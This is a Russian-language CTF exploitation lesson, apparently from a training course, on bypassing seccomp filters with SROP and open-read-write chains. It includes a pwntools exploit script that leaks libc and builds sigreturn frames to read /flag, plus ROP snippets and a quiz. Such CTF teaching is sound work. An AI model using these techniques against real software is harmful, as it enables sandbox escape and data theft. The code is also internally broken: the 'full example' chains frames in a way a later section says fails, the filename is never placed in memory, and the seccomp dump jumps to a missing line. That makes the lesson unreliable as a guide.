---
id: pwn-seccomp-srop
title: "seccomp, SROP и техника ORW"
category: pwn
parent: pwn-ret2dlresolve
difficulty: expert
order: 1
tags: [seccomp, srop, sigreturn, orw, sandbox]
prerequisites: [pwn-ret2dlresolve, pwn-rop]
useful_for:
  - "CTF Pwn категория"
  - "Обход sandbox"
  - "Vulnerability research"
estimated_minutes: 45
summary: "Разбираем sandbox на seccomp, почему system('/bin/sh') не работает, и как применять SROP и цепочки open-read-write (ORW) для чтения флага."
---
seccomp и SROP — два связанных понятия в эксплуатации. seccomp-bpf ограничивает набор разрешённых системных вызовов, часто запрещая `execve` и оставляя только `read`/`write`/`open`. SROP (Sigreturn-Oriented Programming) — техника, позволяющая одним гаджетом `syscall` восстановить все регистры из подделанного sigframe, что идеально подходит для ORW (open/read/write) при seccomp и при нехватке гаджетов.

## Что делает seccomp

seccomp-bpf — фильтр системных вызовов в ядре Linux. Программа (или контейнер) загружает BPF-программу, которая проверяет номер syscall и аргументы, разрешая, запрещая или убивая процесс. Типичный CTF-фильтр: разрешить `read`, `write`, `open`/`openat`, `exit`, `rt_sigreturn`; запретить `execve`, `fork`, `open` (иногда).

```bash
seccomp-tools dump ./chall
```

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A >= 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0x0000003b  if (A != execve) goto 0007
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Разбор: архитектура x86_64, если syscall == `execve` (0x3b) → KILL, иначе ALLOW. Значит, `system('/bin/sh')` и `execve`-shellcode бесполезны; нужен ORW.

## ORW-цепочка через ROP

Простейший обход: открыть файл, прочитать, вывести.

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
rop = ROP(libc)
rop.open(bss, 0, 0)                 # open('/flag') -> rax = fd
rop.read('rax', bss2, 0x100)
rop.write(1, bss2, 0x100)
```

Здесь нужны гаджеты `pop rdi/rsi/rdx`, `pop rax` и `syscall; ret`. Если их нет — используйте SROP.

## SROP: суть

Syscall `rt_sigreturn` (номер 15) восстанавливает состояние процесса из `sigframe` на стеке: все регистры, включая `rip` и `rsp`. Если мы контролируем стек, то, поместив туда подделанный `sigframe` и вызвав `rt_sigreturn`, получаем полный контроль над всеми регистрами одной командой. Для этого нужен всего один гаджет `syscall; ret` и `rax = 15`.

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # или open/read/write
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = next_frame             # куда прыгнуть после
payload = flat({OFFSET: [syscall_ret, 0xf, syscall_ret, frame]})
```

Порядок: первый `syscall; ret` с `rax=15` (мы выставляем rax до этого, либо используем гаджет, который сам ставит 15) вызывает `rt_sigreturn`, ядро читает `sigframe` со стека и восстанавливает регистры, затем `rip` прыгает на `syscall_ret` с уже настроенными регистрами для нужного syscall.

## Полный пример: SROP ORW

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)
OFFSET = 72

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # утечка libc
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [elf.got['puts']])
    rop.call(elf.symbols['main'])
    p.sendlineafter(b'> ', flat({OFFSET: rop.chain()}))
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
    syscall = libc.address + ROP(libc).find_gadget(['syscall', 'ret']).address
    bss = elf.bss() + 0x500

    # frame для open('/flag') -> rax=fd
    f1 = SigreturnFrame()
    f1.rax = constants.SYS_open
    f1.rdi = bss + 0x100
    f1.rsi = 0
    f1.rip = syscall
    f1.rsp = bss
    # frame для read(fd, bss, 0x100)
    f2 = SigreturnFrame()
    f2.rax = constants.SYS_read
    f2.rdi = 3
    f2.rsi = bss + 0x200
    f2.rdx = 0x100
    f2.rip = syscall
    f2.rsp = bss + 0x300
    # frame для write(1, bss, 0x100)
    f3 = SigreturnFrame()
    f3.rax = constants.SYS_write
    f3.rdi = 1
    f3.rsi = bss + 0x200
    f3.rdx = 0x100
    f3.rip = syscall

    payload  = flat({OFFSET: [syscall, 0xf, syscall, f1, f2, f3]})
    p.sendlineafter(b'> ', payload)
    p.sendlineafter(b'> ', b'/flag\x00')
    p.interactive()

exploit()
```

## Условия применимости SROP

| Условие | Почему |
|---|---|
| гаджет `syscall; ret` | вход в `rt_sigreturn` |
| контроль стека | sigframe на стеке |
| `rt_sigreturn` разрешён | seccomp не должен его блокировать |
| известна база libc | адрес syscall-гаджета |

## Тонкости и подводные камни

- **`rax` до syscall должен быть 15.** Иногда нужен гаджет `pop rax; ret` или `mov eax, 15`. Если такого нет — SROP не запустится.
- **Размер frame.** `SigreturnFrame` ~248 байт — проверьте, влезает ли на стек; при нехватке используйте pivot.
- **`rt_sigreturn` под seccomp.** Некоторые фильтры блокируют и его; тогда SROP недоступен.
- **fd файла.** `open` возвращает fd в `rax`; при SROP следующая frame должна знать этот fd. Часто он равен 3, но проверяйте.
- **ORW с openat.** Современные seccomp-фильтры разрешают `openat`, а не `open`; используйте `SYS_openat` (257).
- **Выравнивание.** После восстановления регистров `rsp` задан вами — убедитесь в валидности.

## Справочные таблицы

| Syscall | amd64 | Назначение |
|---|---|---|
| read | 0 | чтение |
| write | 1 | запись |
| open | 2 | открыть |
| openat | 257 | открыть (dirfd) |
| execve | 59 | запуск (запрещён) |
| rt_sigreturn | 15 | SROP |

| Инструмент | Команда |
|---|---|
| seccomp-tools | `seccomp-tools dump ./chall` |
| pwntools | `SigreturnFrame()` |
| pwntools | `ROP(libc).find_gadget(['syscall','ret'])` |

## Что дальше / решение

Дальше: `pwn-rop` (общая сборка), `pwn-stack-pivot` (когда frame не влезает), `pwn-kernel-rop` (SROP в ядре). Практический алгоритм: (1) `seccomp-tools dump` — понять, что запрещено; (2) если `execve` запрещён — строить ORW; (3) если гаджетов хватает — обычная ROP-цепочка open/read/write; (4) если гаджетов мало — SROP с тремя frame; (5) проверить, что `rt_sigreturn` разрешён. seccomp + SROP — стандартная связка для современных задач, где shell недоступен, а нужен только флаг.

## Проверка seccomp: подробный разбор дампа

`seccomp-tools dump` печатает BPF-программу. Читать её нужно так: `A` — аккумулятор, `CODE` — операция (0x20 = загрузить из памяти, 0x15 = jump if equal, 0x06 = return). Строка `if (A != execve) goto 0007` означает: если syscall не execve, прыгнуть на строку 0007, где `return ALLOW`. Иначе — дойти до `return KILL`. Если видите `if (A == open) goto ...` с `return ERRNO`, значит `open` запрещён, и надо использовать `openat`.

Полезные флаги: `seccomp-tools dump ./chall -c` (для setuid), `seccomp-tools dump -f bpf.bin`. Если инструмент недоступен, можно определить запрещённые syscall экспериментально: запустить shellcode с `execve` и посмотреть, убьёт ли процесс.

## SROP с несколькими последовательными вызовами

Один `SigreturnFrame` задаёт одно состояние регистров. Чтобы сделать цепочку `open` → `read` → `write`, после `open` управление должно попасть на подготовку второго frame. Схема: в `rip` первой frame ставим гаджет `syscall; ret`, а в `rsp` — адрес второй frame. После `open` ядро вернёт управление на `syscall; ret`, но перед этим прочитает второй frame со стека и восстановит регистры для `read`. Однако для этого нужно, чтобы `rax` снова был 15 — то есть между frame вставляется вызов `rt_sigreturn`. Практически проще строить цепочку из отдельных SROP-блоков: `syscall` (с rax=15) → `rt_sigreturn` → frame для `open`; затем снова `syscall` (rax=15) → frame для `read`, и так далее.

В pwntools это удобно собирать вручную:

```python
frames = [f_open, f_read, f_write]
payload = flat({OFFSET: [syscall, 0xf, syscall]})
for f in frames:
    payload += bytes(f)
```

## Альтернативы SROP при seccomp

Если SROP недоступен (заблокирован `rt_sigreturn`), остаются: обычная ROP-цепочка ORW (если хватает гаджетов), использование уже открытого дескриптора (`read(3, buf, n)` — флаг часто уже открыт), `sendfile(out_fd, in_fd, ...)` для копирования файла в сокет, `mmap`/`mprotect` для изменения прав памяти. Выбор зависит от того, какие syscall разрешены и какие гаджеты есть.

## Расширенная таблица обхода seccomp

| Разрешено | Техника |
|---|---|
| read/write/open | ORW ROP |
| read/write/openat | openat через ROP |
| только read/write | читать уже открытый fd |
| rt_sigreturn | SROP |
| sendfile | перекачать файл в сокет |
| ничего | задача нерешаема без другого бага |

## SROP без гаджета pop rax

Если нет `pop rax; ret`, выставить `rax = 15` сложнее. Варианты: гаджет `mov eax, 0xf; ret`; использование `read`, возвращающего число прочитанных байт в rax (прочитайте ровно 15 байт — rax станет 15); или `syscall` с уже подходящим rax. Иногда помогает цепочка `xor eax, eax; inc eax` пятнадцать раз — но это редкость. В pwntools часто используют `SigreturnFrame` вместе с предварительным `read`, который возвращает 15. Проверьте доступные гаджеты: `ROPgadget --only 'pop|mov|ret' ./chall | grep -E 'rax|eax'`.

## Итог по seccomp+SROP

Связка seccomp и SROP — стандарт для современных задач, где запрещён `execve`, а нужен только флаг. Сначала `seccomp-tools dump` показывает доступные syscall; затем либо обычная ROP-цепочка ORW, либо SROP с несколькими frame, если гаджетов мало. Ключевые условия: контроль стека, гаджет `syscall; ret`, разрешённый `rt_sigreturn`. Если `rt_sigreturn` запрещён, переходите к чтению уже открытого дескриптора или `sendfile`.

## Квиз

```quiz
- question: "Что делает seccomp-фильтр в контексте pwn-задач?"
  options:
    - "Шифрует память"
    - "Ограничивает набор разрешённых системных вызовов (обычно запрещает execve)"
    - "Отключает ASLR"
    - "Включает canary"
  answer: 1
- question: "Что такое ORW?"
  options:
    - "Цепочка open-read-write для чтения файла без shell"
    - "Тип ROP-gadget"
    - "Метод утечки libc"
    - "Защита"
  answer: 0
- question: "Какой syscall использует SROP?"
  options:
    - "execve"
    - "rt_sigreturn (15)"
    - "read"
    - "mmap"
  answer: 1
- question: "Почему SROP удобен при нехватке gadgets?"
  options:
    - "Он не требует libc"
    - "Восстанавливает ВСЕ регистры из фейкового sigcontext одним syscall"
    - "Он отключает seccomp"
    - "Он быстрее"
  answer: 1
- question: "Номер syscall `execve` на x86-64?"
  options:
    - "11"
    - "59"
    - "15"
    - "2"
  answer: 1
```

## Где пригодится

- **CTF Pwn:** задачи с sandbox (seccomp) — обязательный ORW/SROP.
- **Реальный мир:** обход sandbox (Chrome, контейнеры) эксплуатирует те же идеи (SROP, JOP).
- **Bug bounty:** эксплуатация в условиях ограниченного набора доступных syscalls.
- **Работа:** понимание seccomp как защитной меры и её ограничений.
